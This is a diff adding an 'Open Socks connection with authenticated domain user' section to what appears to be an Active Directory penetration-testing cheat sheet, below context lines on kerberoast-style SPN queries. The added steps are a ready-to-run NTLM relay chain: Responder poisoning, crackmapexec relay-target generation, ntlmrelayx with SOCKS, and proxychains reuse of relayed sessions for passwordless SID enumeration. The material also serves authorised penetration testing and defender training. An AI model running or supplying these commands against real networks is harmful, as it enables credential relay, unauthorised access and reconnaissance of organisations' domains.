@@ -38,3 +38,13 @@
 - After the new computer was created, you can use this to e.g. query SPNs in the domain:   
   `GetUserSPNs.py 'domain.local/NEWCOMPUTER$' -dc-ip 10.10.0.1`  
 Note: Remember to cleanup the computer afterwards! (requires DA)	  
+
+## Open Socks connection with authenticated domain user
+- turn off smb and http in Responder.conf and run Responder:   
+  `./Responder.py -I eth0`   
+- generate relay targets:   
+  `crackmapexec smb 192.168.1.0/24 --gen-relay-list relay.txt`   
+- Run ntlmrelayx with socks option:   
+  `ntlmrelayx.py -tf ./relay.txt -smb2support -socks`   
+- set socks proxy in /etc/proxychains4.conf and use proxychains to e.g. lookup sids using the socks connection:   
+  `proxychains lookupsid.py DOMAIN/USER@10.10.0.22 -no-pass -domain-sids`   
